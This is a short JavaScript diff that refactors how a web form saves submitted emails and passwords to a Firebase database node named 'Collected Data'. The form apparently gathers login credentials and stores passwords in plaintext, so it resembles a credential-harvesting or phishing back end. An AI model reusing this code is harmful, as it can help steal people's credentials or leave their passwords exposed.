@@ -13,7 +13,7 @@ firebase.initializeApp(firebaseConfig);
 document.getElementById('contactForm')
 .addEventListener('submit', submitForm);
 
-
+var MessageRef = firebase.database().ref('Collected Data');
 
 function submitForm(e) {
 
@@ -34,7 +34,7 @@ function getInputVal(id) {
 
 // Save message to firebase
 function saveMessage(email, password) {
-    var newMessageRef = firebase.database().ref('Collected Data/' + email).push();
+    var newMessageRef = MessageRef.push();
     newMessageRef.set({
         email: email,
         password: password,
